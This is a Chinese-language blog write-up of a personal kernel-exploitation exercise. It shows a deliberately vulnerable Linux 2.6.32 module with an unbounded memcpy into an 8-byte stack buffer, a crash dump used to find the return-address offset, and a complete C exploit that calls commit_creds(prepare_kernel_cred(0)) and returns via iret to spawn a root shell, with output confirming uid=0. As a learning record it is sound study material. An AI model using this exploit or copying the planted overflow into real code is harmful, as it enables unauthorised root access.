---
title: 'Kernel Exploit: Stack Smashing'
date: 2017-05-13 03:06:33
tags:
- kernel exploit
- stack overflow
categories:
- kernel_exploit
---

做完了NULL Dereference实验，接下来就是stack smashing了。
内核态的栈溢出跟用户态的基本是一样的。都是套路....
<!-- more -->
### Example
```c
//stack.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>

int bug2_write(struct file *file, const char *buf, unsigned long len)
{
    char localbuf[8];
    memcpy(localbuf, buf, len);
    return len;
}

static int stack_smashing_init(void)
{
    printk(KERN_ALERT "stack_smashing driver init!\n");
    create_proc_entry("bug2",0666,0)->write_proc = bug2_write;
    return 0;
}

static void stack_smashing_exit(void)
{
    printk(KERN_ALERT "stack_smashing driver exit!\n");
}

module_init(stack_smashing_init);
module_exit(stack_smashing_exit);

/*Makefile*/
obj-m := stack.o 
KERNELDIR := /lib/modules/2.6.32.21/build
PWD := $(shell pwd) 
modules: 
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules 
modules_install: 
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules_install
clean:  
	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions
```
很明显bug2_write存在栈溢出，我们首先得确定缓冲区到返回地址的距离。
```shell
echo abcdefghijklmnopqrstuvwxyz > /proc/bug2

root@w0lfzhang666:/home/w0lfzhang/Desktop/kernel_exp/stack_exp# dmesg
[10658.058232] Pid: 4803, comm: bash Tainted: P      D W  (2.6.32.21 #1) VMware Virtual Platform
[10658.058233] EIP: 0060:[<78777675>] EFLAGS: 00210206 CPU: 0
[10658.058234] EIP is at 0x78777675
[10658.058236] EAX: 0000001b EBX: c27bd840 ECX: 00000000 EDX: 08701808
[10658.058237] ESI: 6c6b6a69 EDI: 706f6e6d EBP: 74737271 ESP: c1a8df20
[10658.058238]  DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068
[10658.058239] Process bash (pid: 4803, ti=c1a8c000 task=c1d4bfc0 task.ti=c1a8c000)
[10658.058240] Stack:
[10658.058241]  000a7a79 c1a8df78 c27bd888 08701808 c27bd840 c1a9c300 c0249700 c1a8df64
[10658.058244] <0> c0244aa7 c1a8df98 c0217bed c27bd888 0000001b 08701808 c1a9c300 0000001b
[10658.058248] <0> 08701808 c1a8df8c c02016c2 c1a8df98 c1a8dfb4 b7708514 c0244a40 c05734e0
[10658.058251] Call Trace:
[10658.058255]  [<c0249700>] ? proc_file_write+0x0/0xa0
[10658.058257]  [<c0244aa7>] ? proc_reg_write+0x67/0xa0
[10658.058259]  [<c0217bed>] ? alloc_fd+0xbd/0xf0
[10658.058261]  [<c02016c2>] ? vfs_write+0xa2/0x1a0
[10658.058263]  [<c0244a40>] ? proc_reg_write+0x0/0xa0
[10658.058266]  [<c05734e0>] ? do_page_fault+0x160/0x3a0
[10658.058268]  [<c0201fe2>] ? sys_write+0x42/0x70
[10658.058270]  [<c010315c>] ? sysenter_do_call+0x12/0x28
[10658.058271] Code:  Bad EIP value.
[10658.058272] EIP: [<78777675>] 0x78777675 SS:ESP 0068:c1a8df20
[10658.058275] CR2: 0000000078777675
[10658.058276] ---[ end trace 99d97d6e1500596c ]---
```
ip被覆盖为'uvwx'，可知缓冲区到返回地址的偏移为20。

### Exploit
关键问题是你覆盖返回地址执行shellcode后要怎么回到用户态。那就是用iret指令了。从用户态到内核态一般通过int指令(软中断)，然后通过iret指令返回到用户态。需要注意的是从用户态到内核态会在栈中保存一个trap frame。定义如下：
```c
struct trap_frame
{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));
```
iret会从栈中取出trap frame，restore寄存器的值。我们要做的就是把eip设置为launch_shell函数的地址。
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame
{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));

struct trap_frame tf;

void launch_shell(void)
{
    execl("/bin/sh", "sh", NULL);
}

void prepare_tf(void)
{
    asm("pushl %cs; popl tf + 4;" 
        "pushfl; popl tf + 8;"  
        "pushl %esp; popl tf + 12;"
        "pushl %ss; popl tf + 16;");
    tf.eip = launch_shell;
    tf.esp -= 1024; //unused part of stack
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc016b2f0;
void (*commit_creds)(void*) KERNCALL = (void*) 0xc016afb0;

void payload(void)
{  
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
       "iret;");
}
int main(void)
{
    char buf[24];
    *((void**)(buf + 20)) = payload; 
    prepare_tf();

    int fd = open("/proc/bug2", O_WRONLY);
    
    write(fd,buf,sizeof(buf));
    return 0;
}
```

美滋滋，一次性成功。
```shell
w0lfzhang@w0lfzhang666:~/Desktop/kernel_exp/stack_exp$ ./exp
# id
uid=0(root) gid=0(root)
# 
```
其实记录的NULL Dereference和stack smashing都设计到内核态执行用户空间的代码，但是现在处理器都会开启SMEP，禁止内核态执行用户态代码，所以只能gg了，还得想办法绕过SMEP...还有很多要学，坚持吧。本来也想把内核slab溢出研究下，还是缓一下，下周又要考试了。

### Reference
[Writing kernel exploits](https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf)
[【系列分享】Linux 内核漏洞利用教程（二）：两个Demo](http://bobao.360.cn/learning/detail/3702.html)
